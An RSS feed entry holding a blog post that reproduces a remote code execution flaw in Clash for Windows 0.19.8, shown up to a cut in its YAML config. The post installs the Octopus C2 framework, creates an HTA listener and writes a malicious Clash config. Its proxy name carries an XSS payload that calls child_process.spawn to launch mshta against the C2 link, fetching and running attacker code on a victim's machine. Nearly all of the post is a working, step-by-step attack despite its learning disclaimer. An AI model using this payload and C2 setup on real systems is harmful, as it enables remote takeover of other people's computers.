<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>exploit on CSNek0&#39;s Blog</title>
        <link>https://kira-pgr.github.io/tags/exploit/</link>
        <description>Recent content in exploit on CSNek0&#39;s Blog</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en</language>
        <lastBuildDate>Fri, 25 Feb 2022 23:27:12 -0500</lastBuildDate><atom:link href="https://kira-pgr.github.io/tags/exploit/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>Reproducing Clash RCE</title>
        <link>https://kira-pgr.github.io/p/reproducing-clash-rce/</link>
        <pubDate>Fri, 25 Feb 2022 23:27:12 -0500</pubDate>
        
        <guid>https://kira-pgr.github.io/p/reproducing-clash-rce/</guid>
        <description>&lt;img src="https://kira-pgr.github.io/p/reproducing-clash-rce/cover.jpg" alt="Featured image of post Reproducing Clash RCE" /&gt;&lt;h1 id=&#34;clash-for-windows-rce&#34;&gt;Clash For Windows RCE&lt;/h1&gt;
&lt;hr&gt;
&lt;p&gt;hat is RCE?&lt;/p&gt;
&lt;p&gt;&lt;del&gt;Fake answer: Reliable Computer Engineering&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;It actually stands for Remote Code Execution&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;disclaimer&#34;&gt;Disclaimer&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;This article is PGR&amp;rsquo;s personal note on vulnerability reproduction, intended for reference/learning purposes only. Any loss caused by using the techniques in this article is solely the user&amp;rsquo;s responsibility&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;preparation&#34;&gt;Preparation&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Tip: Please use a Linux machine and a Windows machine, otherwise you may encounter &lt;unexpected&gt; issues&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;(Don&amp;rsquo;t have Linux? Download &lt;a class=&#34;link&#34; href=&#34;https://www.kali.org/get-kali/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Kali Linux&lt;/a&gt;)&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;a-vulnerable-clash-windows-client&#34;&gt;A Vulnerable Clash Windows Client&lt;/h3&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/Fndroid/clash_for_windows_pkg/releases/download/0.19.8/Clash.for.Windows-0.19.8-win.7z&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Download Link&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Download and install it on Windows as instructed&lt;/p&gt;
&lt;h3 id=&#34;c2-tool-octopus&#34;&gt;C2 Tool Octopus&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Perform the following on a Linux system equipped with Python3 and Git&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;If not installed, please refer to:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://kira-pgr.github.io/posts/hugo1/#installing-git-if-already-pre-installed-on-your-system-please-ignore&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Installing Git&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Install Python3: Type &lt;code&gt;sudo apt install python3&lt;/code&gt; in the terminal&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;(Since most systems came with these things preinstalled, search online for installation methods if you&amp;rsquo;re not using a deb-based system)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git clone https://github.com/mhaskar/Octopus.git
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; Octopus
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;pip install -r requirements.txt
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python3 octopus.py
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After successful installation, you should see the following interface&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;┌─&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;askar@hackbook&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;─&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;/opt/redteaming/Octopus&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;└──╼ &lt;span class=&#34;nv&#34;&gt;$python3&lt;/span&gt; octopus.py
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      ___           ___                       ___           ___         ___           ___
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     /  /&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;        /  /&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;         ___        /  /&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;        /  /&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;      /__/&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;        /  /&lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;    /  /::&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;      /  /:/         /  /&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;     /  /::&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;      /  /::&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;     &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;      /  /:/_
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   /  /:/&lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;    /  /:/         /  /:/     /  /:/&lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;    /  /:/&lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;     &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;    /  /:/ /&lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  /  /:/  &lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;  /  /:/  ___    /  /:/     /  /:/  &lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;  /  /:/~/:/  ___  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;  /  /:/ /::&lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt; /__/:/ &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_&lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;/__/:/  /  /&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; /  /::&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;   /__/:/ &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_&lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;/__/:/ /:/  /__/&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_&lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;/__/:/ /:/&lt;span class=&#34;se&#34;&gt;\:\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;/  /:/ &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;/  /:/ /__/:/&lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;/  /:/ &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\/&lt;/span&gt;:/   &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;/  /:/ &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\/&lt;/span&gt;:/~/:/
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt; /:/   &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt; /:/  &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;  &lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt; /:/   &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;:/     &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt; /:/   &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;:/ /:/
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\/&lt;/span&gt;:/     &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\/&lt;/span&gt;:/        &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\/&lt;/span&gt;:/     &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;     &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\/&lt;/span&gt;:/     &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; /:/
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;:/       &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;:/          &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;    &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;:/       &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;     &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;:/        /__/:/
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;         &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;                     &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;         &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;       &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;         &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    v1.2 stable !
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Octopus C2 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Control your shells
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Octopus &amp;gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;To run again, just enter:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python3 octopus.py
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;apache2&#34;&gt;Apache2&lt;/h3&gt;
&lt;p&gt;For deb-based systems:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo apt install apache2
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;For yum-based systems:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo yum -y install httpd
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo firewall-cmd --permanent --add-port&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;80/tcp
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo firewall-cmd --permanent --add-port&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;443/tcp
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo firewall-cmd --reload
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;For other systems, refer to &lt;a class=&#34;link&#34; href=&#34;https://httpd.apache.org/docs/2.4/install.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;the official website&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;vulnerability-reproduction&#34;&gt;Vulnerability Reproduction&lt;/h2&gt;
&lt;h3 id=&#34;linux-attacking-machine&#34;&gt;Linux (Attacking Machine)&lt;/h3&gt;
&lt;p&gt;Open a terminal in the Octopus directory just downloaded&lt;/p&gt;
&lt;p&gt;Type &lt;code&gt;python3 octopus.py&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;After entering the Octopus interface, enter the following&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;listen_http Your_Linux_IP &lt;span class=&#34;m&#34;&gt;5555&lt;/span&gt; Your_Linux_IP &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; AnyName.php Name
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;generate_hta Name
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
&lt;p&gt;A little reminder&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Get IP: Type &lt;code&gt;ifconfig&lt;/code&gt; in the terminal&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Don&amp;rsquo;t just &lt;strong&gt;blindly copy commands&lt;/strong&gt;; you need to change the &lt;strong&gt;ip/name&lt;/strong&gt; yourself&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Now Octopus is listening. Note down the link provided by Octopus and keep this terminal open &lt;strong&gt;(don&amp;rsquo;t close it)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/reproducing-clash-rce/1.png&#34;
	width=&#34;318&#34;
	height=&#34;24&#34;
	srcset=&#34;https://kira-pgr.github.io/p/reproducing-clash-rce/1_hu0562a55e3665f92b18a7212d3551942f_8236_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/reproducing-clash-rce/1_hu0562a55e3665f92b18a7212d3551942f_8236_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;Link Example&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;1325&#34;
		data-flex-basis=&#34;3180px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;Create a configuration file named &lt;code&gt;RCE.yaml&lt;/code&gt; in the default directory of the Apache site &lt;code&gt;/var/www/html/&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Use the following command:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo vi RCE.yaml
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Enter the following content:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;port&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;m&#34;&gt;7890&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;socks-port&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;m&#34;&gt;7891&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;allow-lan&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;mode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;Rule&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;log-level&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;info&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;external-controller&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;9090&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;proxies&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;a&amp;lt;img/src=&amp;#34;1&amp;#34;/onerror=eval(&amp;#39;require(&amp;#34;child_process&amp;#34;).spawn(&amp;#34;mshta&amp;#34;,[&amp;#34;Octopus&amp;#39;s link &amp;#34;])&amp;#39;);&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;socks5&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;server&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;m&#34;&gt;127.0.0.1&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;port&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;17938&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;skip-cert-verify&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;abc&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;socks5&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;server&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;m&#34;&gt;127.0.0.1&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;port&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;8088&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
